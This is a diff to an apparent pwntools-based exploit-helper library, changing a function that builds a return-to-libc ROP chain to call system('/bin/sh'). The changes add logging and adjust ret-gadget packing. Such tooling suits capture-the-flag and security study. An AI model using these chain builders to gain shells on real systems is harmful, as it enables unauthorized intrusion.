@@ -821,15 +821,17 @@ def sh_rop(offset: int = None, POPRDI_RET: int = None, system: int = None, sh: i
 				if debug:
 					info("Getting ROP from libc")
 				rop_libc = ROP(libc)
+			info("Finding POP RDI gadget")
 			POPRDI_RET = rop_libc.find_gadget(['pop rdi', 'ret'])
 			if not POPRDI_RET:
 				error("No POP RDI found in LIBC. Please provide it yourself")
 			POPRDI_RET = POPRDI_RET[0]
-				
+
 		if not POPRDI_RET:
 			error("No POP RDI found in ELF or libc. Please specify it manually.")
 			return None
 	
+	info("Resolving SYSTEM and /bin/sh")
 	if not system:
 		if 'system' in dict(elf.symbols).keys():
 			system = elf.sym.system
@@ -851,11 +853,12 @@ def sh_rop(offset: int = None, POPRDI_RET: int = None, system: int = None, sh: i
 	logleak(sh)
 
 	return flat(
-		cyclic(offset if offset else 0x0),		
+		cyclic(offset if offset else 0x0),
 		POPRDI_RET,
 		sh,
-		(POPRDI_RET+1)*rets,
-		system)
+		(pack(POPRDI_RET+1)*rets) if rets else system,
+		system
+	)
 
 """
 All functions related to format string vulns
